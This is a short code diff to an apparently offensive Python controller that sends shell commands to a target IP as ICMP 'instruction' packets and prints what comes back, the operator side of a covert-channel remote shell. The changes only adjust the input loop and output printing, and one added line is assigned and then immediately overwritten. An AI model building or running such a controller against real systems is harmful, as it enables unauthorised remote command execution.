@@ -11,7 +11,10 @@ from termcolor import colored
 import sys
 import time
 import argparse
-from multiprocessing import Process
+from multiprocessing import Process, Manager
+
+
+
 
 TTL = int(64)
 ICMP_ID = int(12800)
@@ -21,6 +24,8 @@ class Controller(Host):
     def __init__(self):
         super().__init__()
         self.db = TinyDB('./db.json')
+        manager = Manager()
+        self.mock_stdout = manager.__str__()
         self.mock_stdout = ""
 
     def list_hosts(self):
@@ -45,11 +50,9 @@ class Controller(Host):
         sniffer.start()
 
         while True:
-            print(len(self.mock_stdout))
-            if len(self.mock_stdout) == 0:
-                cmd = input(colored("shell > ", "red")).encode()
-                if len(cmd) != 0:
-                    self.send(target['ip'], "instruction", cmd)
+            cmd = input(colored("shell > ", "red")).encode()
+            if len(cmd) != 0:
+                self.send(target['ip'], "instruction", cmd)
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     def instruction(self, shellpack):
@@ -61,7 +64,9 @@ class Controller(Host):
             print(self.mock_stdout)
             self.mock_stdout = ""
         elif shellpack['option'] == "ERROR":
-            print(f"\n[ERROR] {shellpack['data'].decode()}")
+            print(f"[ERROR] {shellpack['data'].decode()}")
+        else:
+            print(f"{shellpack['data'].decode()}")
         
 
 if __name__ == "__main__":
